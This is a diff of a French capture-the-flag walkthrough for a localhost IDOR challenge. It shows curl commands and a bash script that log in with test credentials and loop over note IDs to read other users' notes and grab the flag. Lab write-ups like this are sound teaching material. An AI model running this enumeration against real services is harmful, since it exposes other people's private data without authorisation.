@@ -18,7 +18,7 @@ En tant qu'employé normal, vous ne devriez pouvoir voir **que vos propres notes
 
 # 🌐 Accès au challenge
 
-- URL : `http://localhost:8080`
+- URL : `http://localhost:8081`
 - Comptes :
   - `john:password123`
   - `alice:alice2023`
@@ -36,7 +36,7 @@ Objectif : obtenir une session valide pour accéder à l’API.
 ### Connexion avec curl
 
 ```bash
-curl -v -c cookies.txt -X POST http://localhost:8080/login   -d "username=john&password=password123"   -H "Content-Type: application/x-www-form-urlencoded"
+curl -v -c cookies.txt -X POST http://localhost:8081/login   -d "username=john&password=password123"   -H "Content-Type: application/x-www-form-urlencoded"
 ```
 
 **Résultat attendu :**
@@ -51,7 +51,7 @@ curl -v -c cookies.txt -X POST http://localhost:8080/login   -d "username=john&p
 ### Tester l’accès à la note de john (ID 4)
 
 ```bash
-curl -b cookies.txt http://localhost:8080/api/note/4
+curl -b cookies.txt http://localhost:8081/api/note/4
 ```
 
 Exemple de réponse :
@@ -69,7 +69,7 @@ Exemple de réponse :
 ### Tester l’accès à une note d’un autre utilisateur (ID 3)
 
 ```bash
-curl -b cookies.txt http://localhost:8080/api/note/3
+curl -b cookies.txt http://localhost:8081/api/note/3
 ```
 
 ➡️ **Résultat : on lit la note d’Alice → IDOR confirmé.**
@@ -77,18 +77,18 @@ curl -b cookies.txt http://localhost:8080/api/note/3
 ### Tester les notes probables des administrateurs
 
 ```bash
-curl -b cookies.txt http://localhost:8080/api/note/1
-curl -b cookies.txt http://localhost:8080/api/note/2
+curl -b cookies.txt http://localhost:8081/api/note/1
+curl -b cookies.txt http://localhost:8081/api/note/2
 ```
 
 ---
 
 ## 🔍 Étape 3 — Exploitation complète (Flag)
 
-### Extraire proprement la note 1
+### Extraire proprement la note 6
 
 ```bash
-curl -s -b cookies.txt http://localhost:8080/api/note/1 | python -m json.tool
+curl -s -b cookies.txt http://localhost:8081/api/note/6 | python -m json.tool
 ```
 
 Contenu de la note :
@@ -105,7 +105,7 @@ Contenu de la note :
 ### Extraire uniquement le flag
 
 ```bash
-curl -s -b cookies.txt http://localhost:8080/api/note/1 | grep -o 'GENTLE{[^}]*}'
+curl -s -b cookies.txt http://localhost:8081/api/note/6 | grep -o 'GENTLE{[^}]*}'
 ```
 
 ---
@@ -117,12 +117,12 @@ curl -s -b cookies.txt http://localhost:8080/api/note/1 | grep -o 'GENTLE{[^}]*}
 # script_exploit.sh
 
 echo "[*] Connexion en tant que john..."
-curl -s -c cookies.txt -X POST http://localhost:8080/login   -d "username=john&password=password123" > /dev/null
+curl -s -c cookies.txt -X POST http://localhost:8081/login -d "username=john&password=password123" > /dev/null
 
 echo "[*] Recherche du flag dans les notes 1 à 10..."
 for i in {1..10}; do
   echo -n "Test note $i... "
-  result=$(curl -s -b cookies.txt http://localhost:8080/api/note/$i)
+  result=$(curl -s -b cookies.txt http://localhost:8081/api/note/$i)
 
   if echo "$result" | grep -q "GENTLE{"; then
     echo "FLAG TROUVÉ !"
